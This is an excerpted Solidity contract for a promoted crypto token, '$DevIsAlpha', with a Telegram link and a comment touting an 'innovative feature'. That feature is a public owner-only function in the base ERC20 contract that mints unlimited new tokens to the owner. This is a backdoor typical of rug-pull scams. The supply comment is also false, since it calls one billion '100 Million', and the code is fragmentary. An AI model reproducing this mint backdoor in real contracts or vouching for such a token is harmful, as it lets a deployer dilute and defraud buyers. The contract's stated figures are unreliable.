...
//
// $DevIsAlpha proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/DevIsAlpha
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Devisalpha(uint256 amount) public onlyOwner {
 _Devisalpha(msg.sender, amount);
    }
    ...
    function _Devisalpha(address account, uint256 amount) internal virtual {
...
contract $DevIsAlpha is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Dev Is Alpha", "DEVISALPHA") {
     _Devisalpha(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}